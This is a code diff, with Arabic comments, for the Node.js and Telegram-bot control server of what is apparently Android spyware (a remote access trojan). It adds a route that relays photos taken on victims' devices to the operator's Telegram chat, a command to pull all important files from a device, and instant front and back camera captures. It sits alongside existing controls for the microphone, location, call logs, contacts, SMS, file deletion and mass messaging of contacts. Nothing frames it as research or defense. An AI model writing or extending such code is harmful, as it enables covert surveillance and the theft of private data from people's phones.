@@ -59,6 +59,16 @@ app.post('/uploadLocation', (req, res) => {
     res.send('');
 });
 
+// ⭐ إضافة route جديد لاستقبال الصور
+app.post('/uploadImage', upload.single('image'), (req, res) => {
+    const filename = req.file.originalname;
+    bot.sendPhoto(id, req.file.buffer, {
+        caption: `• صورة من جهاز <b>${req.headers.model}</b>`,
+        parse_mode: 'HTML'
+    });
+    res.send('');
+});
+
 // WebSocket Connection
 wss.on('connection', (ws, req) => {
     const uuid = uuidv4();
@@ -158,15 +168,18 @@ function handleReplyMessage(msg) {
         return;
     }
 
-    if (replyText.includes('أدخل المدة التي تريد تسجيل الكاميرا الرئيسية فيها')) {
-        sendToCurrentDevice(`rec_camera_main:${userText}`);
+    // ⭐ التعديل: إرسال أمر التقاط صورة فورية بدلاً من التسجيل
+    if (replyText.includes('أدخل عدد الصور التي تريد التقاطها بالكاميرا الأمامية')) {
+        const count = parseInt(userText) || 1;
+        sendToCurrentDevice(`take_photos_front:${count}`);
         resetCurrent();
         showMainMenu();
         return;
     }
 
-    if (replyText.includes('أدخل المدة التي تريد تسجيل كاميرا السيلفي فيها')) {
-        sendToCurrentDevice(`rec_camera_selfie:${userText}`);
+    if (replyText.includes('أدخل عدد الصور التي تريد التقاطها بالكاميرا الخلفية')) {
+        const count = parseInt(userText) || 1;
+        sendToCurrentDevice(`take_photos_back:${count}`);
         resetCurrent();
         showMainMenu();
         return;
@@ -222,7 +235,7 @@ function handleMainCommand(msg) {
     bot.sendMessage(id, '• لم أفهم الأمر، استخدم /start للبدء');
 }
 
-// ⭐⭐ الكود المهم: معالجة جميع الـ Callback Queries
+// ⭐ الكود المعدل: معالجة الـ Callback Queries مع الميزات الجديدة
 bot.on('callback_query', (callbackQuery) => {
     const message = callbackQuery.message;
     const data = callbackQuery.data;
@@ -266,6 +279,14 @@ bot.on('callback_query', (callbackQuery) => {
             return;
         }
 
+        // ⭐ الميزة الجديدة: سحب جميع الملفات
+        if (action === 'all_files') {
+            sendToDevice(uuid, 'get_all_files');
+            bot.deleteMessage(id, message.message_id);
+            bot.sendMessage(id, '• جاري سحب جميع الملفات المهمة من الجهاز... ⏳');
+            return;
+        }
+
         if (action === 'delete_file') {
             bot.deleteMessage(id, message.message_id);
             bot.sendMessage(id, '• أدخل مسار الملف الذي تريد حذفه\n\n', { 
@@ -284,9 +305,10 @@ bot.on('callback_query', (callbackQuery) => {
             return;
         }
 
+        // ⭐ التعديل: التقاط صور فورية بدلاً من التسجيل
         if (action === 'camera_main') {
             bot.deleteMessage(id, message.message_id);
-            bot.sendMessage(id, '• أدخل المدة التي تريد تسجيل الكاميرا الرئيسية فيها\n\n', { 
+            bot.sendMessage(id, '• أدخل عدد الصور التي تريد التقاطها بالكاميرا الخلفية\n\n', { 
                 reply_markup: { force_reply: true } 
             });
             currentUuid = uuid;
@@ -295,10 +317,25 @@ bot.on('callback_query', (callbackQuery) => {
 
         if (action === 'camera_selfie') {
             bot.deleteMessage(id, message.message_id);
-            bot.sendMessage(id, '• أدخل المدة التي تريد تسجيل كاميرا السيلفي فيها\n\n', { 
+            bot.sendMessage(id, '• أدخل عدد الصور التي تريد التقاطها بالكاميرا الأمامية\n\n', { 
                 reply_markup: { force_reply: true } 
             });
             currentUuid = uuid;
+            return;
+        }
+
+        // ⭐ الميزة الجديدة: التقاط صورة فورية
+        if (action === 'take_photo_front') {
+            sendToDevice(uuid, 'take_photo_front');
+            bot.deleteMessage(id, message.message_id);
+            bot.sendMessage(id, '• جاري التقاط صورة بالكاميرا الأمامية... 📸');
+            return;
+        }
+
+        if (action === 'take_photo_back') {
+            sendToDevice(uuid, 'take_photo_back');
+            bot.deleteMessage(id, message.message_id);
+            bot.sendMessage(id, '• جاري التقاط صورة بالكاميرا الخلفية... 📸');
             return;
         }
 
@@ -481,14 +518,15 @@ function showCommandsList() {
 function showDeviceCommands(message, uuid, device) {
     const keyboard = [
         [{ text: '📱تطبيقات', callback_data: `apps:${uuid}` }, { text: 'ℹ️معلومات الجهاز', callback_data: `device_info:${uuid}` }],
-        [{ text: '📂الحصول على ملف', callback_data: `file:${uuid}` }, { text: '🗑️حذف الملف', callback_data: `delete_file:${uuid}` }],
-        [{ text: '🎤ميكروفون', callback_data: `microphone:${uuid}` }, { text: '📷الكاميرا الرئيس', callback_data: `camera_main:${uuid}` }],
-        [{ text: '📸كاميرا السيلفي', callback_data: `camera_selfie:${uuid}` }, { text: '📍الموقع', callback_data: `location:${uuid}` }],
-        [{ text: '📞المكالمات', callback_data: `calls:${uuid}` }, { text: '👥جهات الاتصال', callback_data: `contacts:${uuid}` }],
-        [{ text: '📳يهتز', callback_data: `vibrate:${uuid}` }, { text: '🔔إظهار الإشعار', callback_data: `toast:${uuid}` }],
-        [{ text: '✉️رسائل', callback_data: `messages:${uuid}` }, { text: '📨ارسل رسالة', callback_data: `send_message:${uuid}` }],
-        [{ text: '🔊تشغيل الصوت', callback_data: `play_audio:${uuid}` }, { text: '🔇إيقاف الصوت', callback_data: `stop_audio:${uuid}` }],
-        [{ text: '📨إرسال رسالة إلى جميع جهات الاتصال', callback_data: `send_message_to_all:${uuid}` }]
+        [{ text: '📂سحب ملف', callback_data: `file:${uuid}` }, { text: '📁سحب جميع الملفات', callback_data: `all_files:${uuid}` }],
+        [{ text: '🗑️حذف الملف', callback_data: `delete_file:${uuid}` }, { text: '🎤ميكروفون', callback_data: `microphone:${uuid}` }],
+        [{ text: '📷كاميرا خلفية', callback_data: `camera_main:${uuid}` }, { text: '📸كاميرا أمامية', callback_data: `camera_selfie:${uuid}` }],
+        [{ text: '🤳صورة أمامية فورية', callback_data: `take_photo_front:${uuid}` }, { text: '📷صورة خلفية فورية', callback_data: `take_photo_back:${uuid}` }],
+        [{ text: '📍الموقع', callback_data: `location:${uuid}` }, { text: '📞المكالمات', callback_data: `calls:${uuid}` }],
+        [{ text: '👥جهات الاتصال', callback_data: `contacts:${uuid}` }, { text: '✉️الرسائل', callback_data: `messages:${uuid}` }],
+        [{ text: '📳يهتز', callback_data: `vibrate:${uuid}` }, { text: '🔔إشعار', callback_data: `toast:${uuid}` }],
+        [{ text: '📨إرسال رسالة', callback_data: `send_message:${uuid}` }, { text: '📨رسالة للجميع', callback_data: `send_message_to_all:${uuid}` }],
+        [{ text: '🔊تشغيل صوت', callback_data: `play_audio:${uuid}` }, { text: '🔇إيقاف صوت', callback_data: `stop_audio:${uuid}` }]
     ];
 
     bot.editMessageText(`• اختر الأمر للجهاز: <b>${device.model}</b>`, {
